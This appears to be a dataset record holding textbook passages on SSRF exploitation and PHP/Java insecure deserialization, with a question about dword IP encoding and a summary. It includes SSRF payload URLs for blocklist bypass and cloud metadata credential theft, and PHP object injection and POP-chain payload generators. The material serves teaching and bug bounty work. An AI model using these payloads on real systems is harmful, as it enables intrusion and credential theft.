    "text": "The dword, or double word, encoding scheme represents an IP address\nas a single 32-bit integer (called a dword). To translate an address into a\ndword, split the address into four octets (groups of 8 bits), and write out its\nbinary representation. For example, 127.0.0.1 is the decimal representation\nof 01111111.00000000.00000000.00000001. When we translate the entire\nnumber, 01111111000000000000000000000001, into one single decimal\nnumber, we get the IP address in dword format.\nWhat is 127.0.0.1 in dword format? It’s the answer for 127 × 2563 + 0 ×\n2562 + 0 × 2561 + 1 × 2560, which is 2130706433. You could use a binary-to-\ndecimal calculator to calculate this. If you type https://2130706433 instead\nof https://127.0.0.1 in your browser, it would still be understood, and you\ncould use it in the potential SSRF endpoint:\nhttps://public.example.com/proxy?url=https://2130706433\nWhen a server blocks requests to internal hostnames like https://localhost,\ntry its URL-encoded equivalent:\nhttps://public.example.com/proxy?url=https://%6c%6f%63%61%6c%68%6f%73%74\nFinally, you could use a combination of encoding techniques to try to\nfool the blocklist. For example, in the address 0177.0.0.0x1, the first section\nuses octal encoding, the next two use decimal encoding, and the last sec-\ntion uses hex encoding.\nThis is just a small portion of bypasses you can try. You can use many\nmore creative ways to defeat protection and achieve SSRF. When you can’t\nfind a bypass that works, switch your perspective by asking yourself, how would\nI implement a protection mechanism for this feature? Design what you think\nthe protection logic would look like. Then try to bypass the mechanism you’ve\ndesigned. Is it possible? Did you miss anything when implementing the protec-\ntion? Could the developer of the application have missed something too?\nEscalating the Attack\nSSRFs can vary in impact, but they have a lot of potential if you know how\nto escalate them by chaining them with different bugs. Now that you have\nthe basics of SSRFs down, let’s learn to exploit them most effectively.\nWhat you can achieve with an SSRF usually depends on the internal ser-\nvices found on the network. Depending on the situation, you could use SSRF\nto scan the network for reachable hosts, port-scan internal machines to fin-\ngerprint internal services, collect instance metadata, bypass access controls,\nleak confidential data, and even execute code on reachable machines.\nPerform Network Scanning\nYou may sometimes want to scan the network for other reachable machines.\nReachable machines are other network hosts that can be connected to via the\ncurrent machine. These internal machines might host databases, internal\nwebsites, and otherwise sensitive functionalities that an attacker can exploit\n224 Chapter 13\nto their advantage. To perform the scan, feed the vulnerable endpoint a\nrange of internal IP addresses and see if the server responds differently to\neach address. For example, when you request the address 10.0.0.1\nPOST /upload_profile_from_url\nHost: public.example.com\n(POST request body)\nuser_id=1234&url=https://10.0.0.1\nthe server may respond with this message:\nError: cannot upload image: http-server-header: Apache/2.2.8 (Ubuntu) DAV/2\nBut when you request the address 10.0.0.2\nPOST /upload_profile_from_url\nHost: public.example.com\n(POST request body)\nuser_id=1234&url=https://10.0.0.2\nthe server may respond with this message:\nError: cannot upload image: Connection Failed\nYou can deduce that 10.0.0.1 is the address of a valid host on the net-\nwork, while 10.0.0.2 is not. Using the differences in server behavior, you can\ngather info about the network structure, like the number of reachable hosts\nand their IP addresses.\nYou can also use SSRF to port-scan network machines and reveal ser-\nvices running on those machines. Open ports provide a good indicator of\nthe services running on the machine, because services often run on certain\nports by default. For example, by default, SSH runs on port 22, HTTP runs\non port 80, and HTTPS runs on port 443. Port-scan results often point you\nto the ports that you should inspect manually, and they can help you plan\nfurther attacks tailored to the services found.\nProvide the vulnerable endpoint with different port numbers, and then\ndetermine if the server behavior differs between ports. It’s the same process\nas scanning for hosts, except this time, switch out port numbers rather than\nhosts. Port numbers range from 0 to 65,535.\nLet’s say you want to find out which ports are open on an internal\nmachine. When you send a request to port 80 on an internal machine,\nthe server responds with this message:\nError: cannot upload image: http-server-header: Apache/2.2.8 (Ubuntu) DAV/2\nAnd when you send a request to port 11 on the same machine, the\nmachine responds with this message:\nError: cannot upload image: Connection Failed\nServer-Side Request Forgery 225\nWe can deduce that port 80 is open on the machine, while port 11 is\nnot. You can also figure out from the response that the machine is running\nan Apache web server and the Ubuntu Linux distribution. You can use the\nsoftware information revealed here to construct further attacks against the\nsystem.\nPull Instance Metadata\nCloud computing services allow businesses to run their applications on\nother people’s servers. One such service, Amazon Elastic Compute Cloud\n(EC2), offers an instance metadata tool that enables EC2 instances to access\ndata about themselves by querying the API endpoint at 169.254.169.254.\nInstances are virtual servers used for running applications on a cloud pro-\nvider’s infrastructure. Google Cloud offers a similar instance metadata API\nservice.\nThese API endpoints are accessible by default unless network admins\nspecifically block or disable them. The information these services reveal is\noften extremely sensitive and could allow attackers to escalate SSRFs to seri-\nous information leaks and even RCE.\nQuerying EC2 Metadata\nIf a company hosts its infrastructure on Amazon EC2, try querying various\ninstance metadata about the host using this endpoint. For example, this\nAPI request fetches all instance metadata from the running instance:\nhttp://169.254.169.254/latest/meta-data/\nUse this URL in an endpoint vulnerable to SSRF:\nhttps://public.example.com/proxy?url=http://169.254.169.254/latest/meta-data/\nThese endpoints reveal information such as API keys, Amazon S3\ntokens (tokens used to access Amazon S3 buckets), and passwords. Try\nrequesting these especially useful API endpoints:\n• http://169.254.169.254/latest/meta-data/ returns the list of available meta-\ndata that you can query.\n• http://169.254.169.254/latest/meta-data/local-hostname/ returns the internal\nhostname used by the host.\n• http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE\n_NAME returns the security credentials of that role.\n• http://169.254.169.254/latest/dynamic/instance-identity/document/ reveals\nthe private IP address of the current instance.\n• http://169.254.169.254/latest/user-data/ returns user data on the current\ninstance.\nYou can find the complete documentation for the API endpoint at https://\ndocs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html.\n226 Chapter 13\nQuerying Google Cloud Metadata\nIf the company uses Google Cloud, query the Google Instance Metadata\nAPI instead. Google implements additional security measures for its API\nendpoints, so querying Google Cloud Metadata APIv1 requires one of these\nspecial headers:\nMetadata-Flavor: Google\nX-Google-Metadata-Request: True\nThese headers offer protection against SSRFs because most often dur-\ning an SSRF, you cannot specify special headers for the forged request. But\nyou can easily bypass this protection, because most endpoints accessible\nthrough APIv1 can be accessed via the API v1beta1 endpoints instead. API\nv1beta1 is an older version of the metadata API that doesn’t have the same\nheader requirements. Begin by targeting these critical endpoints:\n• http://metadata.google.internal/computeMetadata/v1beta1/instance/service-\naccounts/default/token returns the access token of the default account on\nthe instance.\n• http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/\nssh-keys returns SSH keys that can connect to other instances in this\nproject.\nRead the full API documentation at https://cloud.google.com/compute/\ndocs/storing-retrieving-metadata/. Note that the API v1beta1 was deprecated\nin 2020 and is in the process of being shut down. In the future, you might\nbe required to query metadata with APIv1 and will need to find a way to\nforge the required headers to request instance metadata for targets that use\nGoogle Cloud.\nAmazon and Google aren’t the only web services that provide metadata\nAPIs. However, these two companies control a large share of the market,\nso the company you’re testing is likely on one of these platforms. If not,\nDigitalOcean and Kubernetes clusters are also vulnerable to the same issue.\nFor DigitalOcean, for example, you can retrieve a list of metadata endpoints\nby visiting the http://169.254.169.254/metadata/v1/ endpoint. You can then\nretrieve key pieces of information such as the instance’s hostname and user\ndata. For Kubernetes, try accessing https://kubernetes.default and https://kubernetes\n.default.svc/metrics for information about the system.\nExploit Blind SSRFs\nBecause blind SSRFs don’t return a response or error message, their exploi-\ntation is often limited to network mapping, port scanning, and service\ndiscovery. Also, since you can’t extract information directly from the target\nserver, this exploitation relies heavily on inference. Yet by analyzing HTTP\nstatus codes and server response times, we can often achieve results similar\nto regular SSRF.\nServer-Side Request Forgery 227\nNetwork and Port Scanning Using HTTP Status Codes\nRemember from Chapter 5 that HTTP status codes provide information about\nwhether the request succeeded. By comparing the response codes returned\nfor requests to different endpoints, we can infer which of them are valid. For\nexample, if a request for https://public.example.com/webhook?url=10.0.0.1 results\nin an HTTP status code of 200, while a request for https://public.example.com/\nwebhook?url=10.0.0.2 results in an HTTP status code of 500, we can deduce that\n10.0.0.1 is the address of a valid host on the network while 10.0.0.2 is not.\nPort scanning with blind SSRF works the same way. If the server\nreturns a 200 status code for some ports, and 500 for others, the 200 status\ncode might indicate open ports on the machine. On the other hand, if all\nrequests return the same status code, the site might have implemented pro-\ntection against SSRF port scanning.\nNetwork and Port Scanning Using Server Response Times\nIf the server isn’t returning any useful information in the form of status\ncodes, you might still be able to figure out the network structure by examin-\ning how long the server is taking to respond to your request. If it takes much\nlonger to respond for some addresses, those network addresses might be\nunrouted or hidden behind a firewall. Unrouted addresses cannot be reached\nfrom the current machine. On the other hand, unusually short response\ntimes may also indicate an unrouted address, because the router might have\ndropped the request immediately.\nWhen performing any kind of network or port scanning, it is impor-\ntant to remember that machines behave differently. The key is to look for\ndifferences in behavior from the machines on the same network, instead\nof the specific signatures like response times or response codes described\npreviously.\nThe target machine might also leak sensitive information in outbound\nrequests, such as internal IPs, headers, and version numbers of the software\nused. If you can’t access an internal address, you can always try to provide\nthe vulnerable endpoint with the address of a server you own and see what\nyou can extract from the incoming request.\nAttack the Network\nUse what you’ve found by scanning the network, identifying services, and\npulling instance metadata to execute attacks that have impact. Notably, you\nmay be able to bypass access controls, leak confidential information, and\nexecute code.\nFirst, try to bypass access control. Some internal services might control\naccess based on IP addresses or internal headers only, so it might be pos-\nsible to bypass controls to sensitive functionalities by simply sending the\nrequest from a trusted machine. For example, you might be able to access\ninternal websites by proxying through a web server:\nhttps://public.example.com/proxy?url=https://admin.example.com\n228 Chapter 13\nYou can also try to execute internal API calls through the SSRF end-\npoint. This type of attack requires knowledge about the internal system\nand API syntax, which you can obtain by conducting recon and via other\ninformation leaks from the system. For example, let’s say the API endpoint\nadmin.example.com/delete_user deletes a user and can only be requested by an\ninternal address. You could trigger the request if you find an SSRF that lets\nyou send a request from a machine in the trusted network:\nhttps://public.example.com/send_request?url=https://admin.example.com/delete_user?user=1\nSecond, if you were able to find credentials using the SSRF by leaking\ninfo via headers or by querying instance metadata, use those credentials\nto access confidential information stored on the network. For example, if\nyou were able to find Amazon S3 keys, enumerate the company’s private S3\nbuckets and see if you can access them with the credentials you found.\nThird, use the info you gathered to turn SSRF into remote code execu-\ntion (which you’ll learn more about in Chapter 18). For example, if you\nfound admin credentials that give you write privileges, try uploading a shell\nto the web server. Or, if you found an unsecured admin panel, see if any fea-\ntures allow the execution of scripts. You can also use either classic or blind\nSSRF to test for other vulnerabilities on the target’s network by sending pay-\nloads designed to detect well-known vulnerabilities to reachable machines.\nFinding Your First SSRF!\nLet’s review the steps you can take to find your first SSRF:\n1. Spot the features prone to SSRFs and take notes for future reference.\n2. Set up a callback listener to detect blind SSRFs by using an online ser-\nvice, Netcat, or Burp’s Collaborator feature.\n3. Provide the potentially vulnerable endpoints with common internal\naddresses or the address of your callback listener.\n4. Check if the server responds with information that confirms the SSRF.\nOr, in the case of a blind SSRF, check your server logs for requests from\nthe target server.\n5. In the case of a blind SSRF, check if the server behavior differs when\nyou request different hosts or ports.\n6. If SSRF protection is implemented, try to bypass it by using the strate-\ngies discussed in this chapter.\n7. Pick a tactic to escalate the SSRF.\n8. Draft your first SSRF report!\nServer-Side Request Forgery 229",
    "question": "What is the decimal representation of the IP address 127.0.0.1 in dword format?",
    "summary": "A double word (dword) encoding scheme represents an IP address as a 32-bit integer. For example, 127.0.0.1 in dword format is 2130706433. SSRF vulnerabilities can be exploited to bypass protections and access internal services, which may reveal sensitive information or allow further attacks. By using different encoding techniques or analyzing server responses, attackers can identify reachable hosts, open ports, and instance metadata, which can lead to more advanced exploits like remote code execution."
  },
  {
    "start": 161,
    "end": 166,
    "text": "14\nINSECURE DESERIALIZ ATION\nInsecure deserialization vulnerabilities hap-\npen when applications deserialize program\nobjects without proper precaution. An attacker\ncan then manipulate serialized objects to change\nthe program’s behavior.\nInsecure deserialization bugs have always fascinated me. They’re hard to\nfind and exploit, because they tend to look different depending on the pro-\ngramming language and libraries used to build the application. These bugs\nalso require deep technical understanding and ingenuity to exploit. Although\nthey can be a challenge to find, they are worth the effort. Countless write-ups\ndescribe how researchers used these bugs to achieve RCE on critical assets\nfrom companies such as Google and Facebook.\nIn this chapter, I’ll talk about what insecure deserialization is, how inse-\ncure deserialization bugs happen in PHP and Java applications, and how\nyou can exploit them.\nMechanisms\nSerialization is the process by which some bit of data in a programming lan-\nguage gets converted into a format that allows it to be saved in a database\nor transferred over a network. Deserialization refers to the opposite process,\nwhereby the program reads the serialized object from a file or the network\nand converts it back into an object.\nThis is useful because some objects in programming languages are\ndifficult to transfer through a network or to store in a database without cor-\nruption. Serialization and deserialization allow programming languages to\nreconstruct identical program objects in different computing environments.\nMany programming languages support the serialization and deserialization\nof objects, including Java, PHP, Python, and Ruby.\nDevelopers often trust user-supplied serialized data because it is difficult to\nread or unreadable to users. This trust assumption is what attackers can abuse.\nInsecure deserialization is a type of vulnerability that arises when an attacker\ncan manipulate the serialized object to cause unintended consequences in\nthe program. This can lead to authentication bypasses or even RCE. For\nexample, if an application takes a serialized object from the user and uses the\ndata contained in it to determine who is logged in, a malicious user might\nbe able to tamper with that object and authenticate as someone else. If the\napplication uses an unsafe deserialization operation, the malicious user might\neven be able to embed code snippets in the object and get it executed during\ndeserialization.\nThe best way to understand insecure deserialization is to learn how dif-\nferent programming languages implement serialization and deserialization.\nSince these processes look different in every language, we’ll explore how\nthis vulnerability presents itself in PHP and Java. Before we continue, you’ll\nneed to install PHP and Java if you want to test out the example code in this\nchapter.\nYou can install PHP by following the instructions for your system on the\nPHP manual page (https://www.php.net/manual/en/install.php). You can then\nrun PHP scripts by running php YOUR_PHP_SCRIPT.php using the command\nline. Alternatively, you can use an online PHP tester like ExtendsClass\n(https://extendsclass.com/php.html) to test the example scripts. Search online\nPHP tester for more options. Note that not all online PHP testers support\nserialization and deserialization, so make sure to choose one that does.\nMost computers should already have Java installed. If you run java -version\nat the command line and see a Java version number returned, you don’t have\nto install Java again. Otherwise, you can find the instructions to install Java\nat https://java.com/en/download/help/download_options.html. You can also use an\nonline Java compiler to test your code; Tutorials Point has one at https://www.\ntutorialspoint.com/compile_java_online.php.\nPHP\nAlthough most deserialization bugs in the wild are caused by insecure dese-\nrialization in Java, I’ve also found PHP deserialization vulnerabilities to be\nextremely common. In my research project that studied publicly disclosed\n232 Chapter 14\ndeserialization vulnerabilities on HackerOne, I discovered that half of all\ndisclosed deserialization vulnerabilities were caused by insecure deserial-\nization in PHP. I also found that most deserialization vulnerabilities are\nresolved as high-impact or critical-impact vulnerabilities; incredibly, most\ncan be used to cause the execution of arbitrary code on the target server.\nWhen insecure deserialization vulnerabilities occur in PHP, we some-\ntimes call them PHP object injection vulnerabilities. To understand PHP object\ninjections, you first need to understand how PHP serializes and deserializes\nobjects.\nWhen an application needs to store a PHP object or transfer it over the\nnetwork, it calls the PHP function serialize() to pack it up. When the appli-\ncation needs to use that data, it calls unserialize() to unpack and get the\nunderlying object.\nFor example, this code snippet will serialize the object called user:\n<?php\n1 class User{\npublic $username;\npublic $status;\n}\n2 $user = new User;\n3 $user->username = 'vickie';\n4 $user->status = 'not admin';\n5 echo serialize($user);\n?>\nThis piece of PHP code declares a class called User. Each User object\nwill contain a $username and a $status attribute 1. It then creates a new User\nobject called $user 2. It sets the $username attribute of $user to 'vickie' 3\nand its $status attribute to 'not admin' 4. Then, it serializes the $user object\nand prints out the string representing the serialized object 5.\nStore this code snippet as a file named serialize_test.php and run it using\nthe command php serialize_test.php. You should get the serialized string\nthat represents the user object:\nO:4:\"User\":2:{s:8:\"username\";s:6:\"vickie\";s:6:\"status\";s:9:\"not admin\";}\nLet’s break down this serialized string. The basic structure of a PHP\nserialized string is data type:data. In terms of data types, b represents a\nBoolean, i represents an integer, d represents a float, s represents a string,\na represents an array, and O represents an object instance of a particular\nclass. Some of these types get followed by additional information about the\ndata, as described here:\nb:THE_BOOLEAN;\ni:THE_INTEGER;\nd:THE_FLOAT;\ns:LENGTH_OF_STRING:\"ACTUAL_STRING\";\na:NUMBER_OF_ELEMENTS:{ELEMENTS}\nO:LENGTH_OF_NAME:\"CLASS_NAME\":NUMBER_OF_PROPERTIES:{PROPERTIES}\nInsecure Deserialization 233\nUsing this reference as a guide, we can see that our serialized string rep-\nresents an object of the class User. It has two properties. The first property\nhas the name username and the value vickie. The second property has the\nname status and the value not admin. The names and values are all strings.\nWhen you’re ready to operate on the object again, you can deserialize\nthe string with unserialize():\n<?php\n1 class User{\npublic $username;\npublic $status;\n}\n$user = new User;\n$user->username = 'vickie';\n$user->status = 'not admin';\n$serialized_string = serialize($user);\n2 $unserialized_data = unserialize($serialized_string);\n3 var_dump($unserialized_data);\nvar_dump($unserialized_data[\"status\"]);\n?>\nThe first few lines of this code snippet create a user object, serialize it,\nand store the serialized string into a variable called $serialized_string 1.\nThen, it unserializes the string and stores the restored object into the vari-\nable $unserialized_data 2. The var_dump() PHP function displays the value\nof a variable. The last two lines display the value of the unserialized object\n$unserialized_data and its status property 3.\nMost object-oriented programming languages have similar interfaces\nfor serializing and deserializing program objects, but the format of their\nserialized objects are different. Some programming languages also allow\ndevelopers to serialize into other standardized formats, such as JSON\nand YAML.\nControlling Variable Values\nYou might have already noticed something fishy here. If the serialized\nobject isn’t encrypted or signed, can anyone create a User object? The\nanswer is yes! This is a common way insecure deserialization endangers\napplications.\nOne possible way of exploiting a PHP object injection vulnerability is\nby manipulating variables in the object. Some applications simply pass in a\nserialized object as a method of authentication without encrypting or sign-\ning it, thinking the serialization alone will stop users from tampering with\nthe values. If that’s the case, you can mess with the values encoded in the\nserialized string:\n<?php\nclass User{\npublic $username;\n234 Chapter 14\npublic $status;\n}\n$user = new User;\n$user->username = 'vickie';\n1 $user->status = 'admin';\necho serialize($user);\n?>\nIn this example of the User object we created earlier, you change the\nstatus to admin by modifying your PHP script 1. Then you can intercept the\noutgoing request in your proxy and insert the new object in place of the old\none to see if the application grants you admin privileges.\nYou can also change your serialized string directly:\nO:4:\"User\":2:{s:8:\"username\";s:6:\"vickie\";s:6:\"status\";s:9:\"admin\";}\nIf you’re tampering with the serialized string directly, remember to\nchange the string’s length marker as well, since the length of your status\nstring has changed:\nO:4:\"User\":2:{s:8:\"username\";s:6:\"vickie\";s:6:\"status\";s:5:\"admin\";}\nunserialize() Under the Hood\nTo understand how unserialize() can lead to RCEs, let’s take a look at how\nPHP creates and destroys objects.\nPHP magic methods are method names in PHP that have special proper-\nties. If the serialized object’s class implements any method with a magic\nname, these methods will have magic properties, such as being automati-\ncally run during certain points of execution, or when certain conditions are\nmet. Two of these magic methods are __wakeup() and __destruct().\nThe __wakeup() method is used during instantiation when the program\ncreates an instance of a class in memory, which is what unserialize() does;\nit takes the serialized string, which specifies the class and the properties of\nthat object, and uses that data to create a copy of the originally serialized\nobject. It then searches for the __wakeup() method and executes code in it.\nThe __wakeup() method is usually used to reconstruct any resources that the\nobject may have, reestablish any database connections that were lost during\nserialization, and perform other reinitialization tasks. It’s often useful dur-\ning a PHP object injection attack because it provides a convenient entry point\nto the server’s database or other functions in the program.\nThe program then operates on the object and uses it to perform other\nactions. When no references to the deserialized object exist, the program\ncalls the __destruct() function to clean up the object. This method often\ncontains useful code in terms of exploitation. For example, if a __destruct()\nmethod contains code that deletes and cleans up files associated with the\nobject, the attacker might be able to mess with the integrity of the filesys-\ntem by controlling the input passed into those functions.\nInsecure Deserialization 235\nAchieving RCE\nWhen you control a serialized object passed into unserialize(), you con-\ntrol the properties of the created object. You might also be able to control\nthe values passed into automatically executed methods like __wakeup() or\n__destruct(). If you can do that, you can potentially achieve RCE.\nFor example, consider this vulnerable code example, taken from https://\nwww.owasp.org/index.php/PHP_Object_Injection:\n1 class Example2\n{\nprivate $hook;\nfunction __construct(){\n// some PHP code...\n}\nfunction __wakeup(){\n2 if (isset($this->hook)) eval($this->hook);\n}\n}\n// some PHP code...\n3 $user_data = unserialize($_COOKIE['data']);\nThe code declares a class called Example2. It has a $hook attribute and two\nmethods: __construct() and __wakeup() 1. The __wakeup() function executes\nthe string stored in $hook as PHP code if $hook is not empty 2. The PHP\neval() function takes in a string and runs the content of the string as PHP\ncode. Then, the program runs unserialize() on a user-supplied cookie\nnamed data 3.\nHere, you can achieve RCE because the code passes a user-provided\nobject into unserialize(), and there is an object class, Example2, with a magic\nmethod that automatically runs eval() on user-provided input when the\nobject is instantiated.\nTo exploit this RCE, you’d set your data cookie to a serialized Example2\nobject, and the hook property to whatever PHP code you want to execute.\nYou can generate the serialized object by using the following code snippet:\nclass Example2\n{\nprivate $hook = \"phpinfo();\";\n}\nprint 1 urlencode(serialize(new Example2));\nBefore we print the object, we need to URL-encode it 1, since we’ll be\ninjecting the object via a cookie. Passing the string generated by this code\ninto the data cookie will cause the server to execute the PHP code phpinfo();,\nwhich outputs information about PHP’s configuration on the server. The\n236 Chapter 14\nphpinfo() function is often used as a proof-of-concept function to run in\nbug reports to proof successful PHP command injection. The following is\nwhat happens in detail on the target server during this attack:\n1. The serialized Example2 object is passed into the program as the data\ncookie.\n2. The program calls unserialize() on the data cookie.\n3. Because the data cookie is a serialized Example2 object, unserialize()\ninstantiates a new Example2 object.\n4. The unserialize() function sees that the Example2 class has __wakeup()\nimplemented, so __wakeup() is called.\n5. The __wakeup() function looks for the object’s $hook property, and if it is\nnot NULL, it runs eval($hook).\n6. The $hook property is not NULL, because it is set to phpinfo();, and so\neval(\"phpinfo();\") is run.\n7. You’ve achieved RCE by executing the arbitrary PHP code you’ve placed\nin the data cookie.\nUsing Other Magic Methods\nSo far, we’ve mentioned the magic methods __wakeup() and __destruct().\nThere are actually four magic methods you’ll find particularly useful when\ntrying to exploit an unserialize() vulnerability: __wakeup(), __destruct(),\n__toString(), and __call().\nUnlike __wakeup() and __destruct(), which always get executed if the\nobject is created, the __toString() method is invoked only when the object\nis treated as a string. It allows a class to decide how it will react when one of\nits objects is treated as a string. For example, it can decide what to display if\nthe object is passed into an echo() or print() function. You’ll see an example\nof using this method in a deserialization attack in “Using POP Chains” on\npage 238.\nA program invokes the __call() method when an undefined method\nis called. For example, a call to $object->undefined($args) will turn into\n$object->__call('undefined', $args). Again, the exploitability of this magic\nmethod varies wildly, depending on how it was implemented. Sometimes\nattackers can exploit this magic method when the application’s code con-\ntains a mistake or when users are allowed to define a method name to call\nthemselves.\nYou’ll typically find these four magic methods the most useful for\nexploitation, but many other methods exist. If the ones mentioned here\naren’t exploitable, it might be worth checking out the class’s implementa-\ntion of the other magic methods to see whether you can start an exploit\nfrom there. Read more about PHP’s magic methods at https://www.php.net/\nmanual/en/language.oop5.magic.php.\nInsecure Deserialization 237\nUsing POP Chains\nSo far, you know that when attackers control a serialized object passed into\nunserialize(), they can control the properties of the created object. This\ngives them the opportunity to hijack the flow of the application by choosing\nthe values passed into magic methods like __wakeup().\nThis exploit works . . . sometimes. But this approach has a problem: what\nif the declared magic methods of the class don’t contain any useful code in\nterms of exploitation? For example, sometimes the available classes for object\ninjections contain only a few methods, and none of them contain code injec-\ntion opportunities. Then the unsafe deserialization is useless, and the exploit\nis a bust, right?\nWe have another way of achieving RCE even in this scenario: POP chains.\nA property-oriented programming (POP) chain is a type of exploit whose name\ncomes from the fact that the attacker controls all of the deserialized object’s\nproperties. POP chains work by stringing bits of code together, called gadgets,\nto achieve the attacker’s ultimate goal. These gadgets are code snippets bor-\nrowed from the codebase. POP chains use magic methods as their initial gad-\nget. Attackers can then use these methods to call other gadgets.\nIf this seems abstract, consider the following example application code,\ntaken from https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection:\nclass Example\n{\n1 private $obj;\nfunction __construct()\n{\n// some PHP code...\n}\nfunction __wakeup()\n{\n2 if (isset($this->obj)) return $this->obj->evaluate();\n}\n}\nclass CodeSnippet\n{\n3 private $code;\n4 function evaluate()\n{\neval($this->code);\n}\n}\n// some PHP code...\n5 $user_data = unserialize($_POST['data']);\n// some PHP code...\n238 Chapter 14\nIn this application, the code defines two classes: Example and CodeSnippet.\nExample has a property named obj 1, and when an Example object is deserial-\nized, its __wakeup() function is called, which calls obj’s evaluate() method 2.\nThe CodeSnippet class has a property named code that contains the code\nstring to be executed 3 and an evaluate() method 4, which calls eval() on\nthe code string.\nIn another part of the code, the program accepts the POST parameter\ndata from the user and calls unserialize() on it 5.\nSince that last line contains an insecure deserialization vulnerability, an\nattacker can use the following code to generate a serialized object:\nclass CodeSnippet\n{\nprivate $code = \"phpinfo();\";\n}\nclass Example\n{\nprivate $obj;\nfunction __construct()\n{\n$this->obj = new CodeSnippet;\n}\n}\nprint urlencode(serialize(new Example));\nThis code snippet defines a class named CodeSnippet and set its code prop-\nerty to phpinfo();. Then it defines a class named Example, and sets its obj\nproperty to a new CodeSnippet instance on instantiation. Finally, it creates an\nExample instance, serializes it, and URL-encodes the serialized string. The\nattacker can then feed the generated string into the POST parameter data.\nNotice that the attacker’s serialized object uses class and property names\nfound elsewhere in the application’s source code. As a result, the program\nwill do the following when it receives the crafted data string.\nFirst, it will unserialize the object and create an Example instance. Then,\nsince Example implements __wakeup(), the program will call __wakeup() and\nsee that the obj property is set to a CodeSnippet instance. Finally, it will call\nthe evaluate() method of the obj, which runs eval(\"phpinfo();\"), since the\nattacker set the code property to phpinfo(). The attacker is able to execute\nany PHP code of their choosing.\nPOP chains achieve RCE by chaining and reusing code found in the\napplication’s codebase. Let’s look at another example of how to use POP\nchains to achieve SQL injection. This example is also taken from https://\nowasp.org/www-community/vulnerabilities/PHP_Object_Injection.\nSay an application defines a class called Example3 somewhere in the code\nand deserializes unsanitized user input from the POST parameter data:\nclass Example3\n{\nprotected $obj;\nfunction __construct()\n{\nInsecure Deserialization 239\n// some PHP code...\n}\n1 function __toString()\n{\nif (isset($this->obj)) return $this->obj->getValue();\n}\n}\n// some PHP code...\n$user_data = unserialize($_POST['data']);\n// some PHP code...\nNotice that Example3 implements the __toString() magic method 1. In\nthis case, when an Example3 instance is treated as a string, it will return the\nresult of the getValue() method run on its $obj property.\nLet’s also say that, somewhere in the application, the code defines the\nclass SQL_Row_Value. It has a method named getValue(), which executes a SQL\nquery. The SQL query takes input from the $_table property of the SQL_Row\n_Value instance:\nclass SQL_Row_Value\n{\nprivate $_table;\n// some PHP code...\nfunction getValue($id)\n{\n$sql = \"SELECT * FROM {$this->_table} WHERE id = \" . (int)$id;\n$result = mysql_query($sql, $DBFactory::getConnection());\n$row = mysql_fetch_assoc($result);\nreturn $row['value'];\n}\n}\nAn attacker can achieve SQL injection by controlling the $obj in Example3.\nThe following code will create an Example3 instance with $obj set to a SQL_Row\n_Value instance, and with $_table set to the string \"SQL Injection\":\nclass SQL_Row_Value\n{\nprivate $_table = \"SQL Injection\";\n}\nclass Example3\n{\nprotected $obj;\nfunction __construct()\n{\n$this->obj = new SQL_Row_Value;\n}\n}\nprint urlencode(serialize(new Example3));\n240 Chapter 14\nAs a result, whenever the attacker’s Example3 instance is treated as a\nstring, its $obj’s get_Value() method will be executed. This means the SQL\n_Row_Value’s get_Value() method will be executed with the $_table string set\nto \"SQL Injection\".\nThe attacker has achieved a limited SQL injection, since they can con-\ntrol the string passed into the SQL query SELECT * FROM {$this->_table} WHERE\nid = \" . (int)$id;.\nPOP chains are similar to return-oriented programming (ROP) attacks, an\ninteresting technique used in binary exploitation. You can read more about\nit on Wikipedia, at https://en.wikipedia.org/wiki/Return-oriented_programming.\nJava\nNow that you understand how insecure deserialization in PHP works, let’s\nexplore another programming language prone to these vulnerabilities:\nJava. Java applications are prone to insecure deserialization vulnerabilities\nbecause many of them handle serialized objects. To understand how to\nexploit deserialization vulnerabilities in Java, let’s look at how serializa-\ntion and deserialization work in Java.\nFor Java objects to be serializable, their classes must implement the\njava.io.Serializable interface. These classes also implement special methods,\nwriteObject() and readObject(), to handle the serialization and deserializa-\ntion, respectively, of objects of that class. Let’s look at an example. Store this\ncode in a file named SerializeTest.java:\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.Serializable;\nimport java.io.IOException;\n1 class User implements Serializable{\n2 public String username;\n}\npublic class SerializeTest{\npublic static void main(String args[]) throws Exception{\n3 User newUser = new User();\n4 newUser.username = \"vickie\";\nFileOutputStream fos = new FileOutputStream(\"object.ser\");\nObjectOutputStream os = new ObjectOutputStream(fos);\n5 os.writeObject(newUser);\nos.close();\nFileInputStream is = new FileInputStream(\"object.ser\");\nObjectInputStream ois = new ObjectInputStream(is);\nInsecure Deserialization 241\n6 User storedUser = (User)ois.readObject();\nSystem.out.println(storedUser.username);\nois.close();\n}\n}\nThen, in the directory where you stored the file, run these commands.\nThey will compile the program and run the code:\n$ javac SerializeTest.java\n$ java SerializeTest\nYou should see the string vickie printed as the output. Let’s break down\nthe program a bit. First, we define a class named User that implements\nSerializable 1. Only classes that implement Serializable can be serialized\nand deserialized. The User class has a username attribute that is used to store\nthe user’s username 2.\nThen, we create a new User object 3 and set its username to the string\n\"vickie\" 4. We write the serialized version of newUser and store it into the\nfile object.ser 5. Finally, we read the object from the file, deserialize it, and\nprint out the user’s username 6.\nTo exploit Java applications via an insecure deserialization bug, we first\nhave to find an entry point through which to insert the malicious serialized\nobject. In Java applications, serializable objects are often used to transport\ndata in HTTP headers, parameters, or cookies.\nJava serialized objects are not human readable like PHP serialized\nstrings. They often contain non-printable characters as well. But they do\nhave a couple signatures that can help you recognize them and find poten-\ntial entry points for your exploits:\n• Starts with AC ED 00 05 in hex or rO0 in base64. (You might see these\nwithin HTTP requests as cookies or parameters.)\n• The Content-Type header of an HTTP message is set to application/x\n-java-serialized-object.\nSince Java serialized objects contain a lot of special characters, it’s\ncommon to encode them before transmission, so look out for differently\nencoded versions of these signatures as well.\nAfter you discover a user-supplied serialized object, the first thing you\ncan try is to manipulate program logic by tampering with the information\nstored within the objects. For example, if the Java object is used as a cookie\nfor access control, you can try changing the usernames, role names, and\nother identity markers that are present in the object, re-serialize it, and\nrelay it back to the application. You can also try tampering with any sort of\nvalue in the object that is a filepath, file specifier, or control flow value to\nsee if you can alter the program’s flow.\nSometimes when the code doesn’t restrict which classes the application\nis allowed to deserialize, it can deserialize any serializable classes to which\n242 Chapter 14\nit has access. This means attackers can create their own 